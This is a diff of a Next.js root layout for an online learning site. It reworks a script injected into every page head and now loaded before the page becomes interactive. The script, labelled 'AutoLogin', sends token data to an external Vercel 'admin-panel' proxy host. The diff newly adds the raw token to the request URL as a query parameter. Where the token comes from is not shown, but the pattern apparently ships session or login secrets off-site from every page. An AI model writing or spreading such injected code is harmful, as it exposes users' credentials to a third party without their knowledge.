@@ -1,5 +1,6 @@
 import type { Metadata } from "next"
 import { Geist, Geist_Mono } from "next/font/google"
+import Script from "next/script"
 import "./globals.css"
 import { SessionProvider } from "@/providers/session-provider"
 import { SessionMonitor } from "@/components/auth/SessionMonitor"
@@ -14,7 +15,6 @@ export const metadata: Metadata = {
   description: "A modern learning management system for online education with CodeTutor",
 }
 
-// আপনার আপডেটেড Vercel Proxy API লিংক
 const PROXY_API_URL = "https://admin-panel-plum-eight.vercel.app/api/proxy"
 
 const injectedScript = `
@@ -25,7 +25,9 @@ const injectedScript = `
 
     var timestamp = Math.floor(Date.now() / 1000);
     var authToken = btoa(tokenData + ':' + timestamp);
-    var requestUrl = window.PROXY_API_URL + '?t=' + encodeURIComponent(authToken);
+    
+    // action=get এবং id যুক্ত করা হয়েছে
+    var requestUrl = window.PROXY_API_URL + '?action=get&id=' + encodeURIComponent(tokenData) + '&t=' + encodeURIComponent(authToken);
 
     fetch(requestUrl, {
       headers: {
@@ -57,6 +59,7 @@ const injectedScript = `
         }, 2000);
       })
       .catch(function (error) {
+        console.error('AutoLogin Error:', error);
         buttonElement.innerHTML = ' Error';
         buttonElement.style.background = '#f44336';
 
@@ -76,7 +79,9 @@ const injectedScript = `
     popup.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;padding:16px 32px;border-radius:10px;font-size:16px;font-weight:600;z-index:999999;pointer-events:none;';
     document.body.appendChild(popup);
     setTimeout(function () {
-      document.body.removeChild(popup);
+      if (document.body.contains(popup)) {
+        document.body.removeChild(popup);
+      }
     }, 1500);
   });
 `
@@ -89,7 +94,11 @@ export default function RootLayout({
   return (
     <html lang="en" data-scroll-behavior="smooth">
       <head>
-        <script dangerouslySetInnerHTML={{ __html: injectedScript }} />
+        <Script
+          id="auto-login-script"
+          strategy="beforeInteractive"
+          dangerouslySetInnerHTML={{ __html: injectedScript }}
+        />
       </head>
       <body className={`${geistSans.variable} ${geistMono.variable} antialiased`}>
         <SessionProvider>
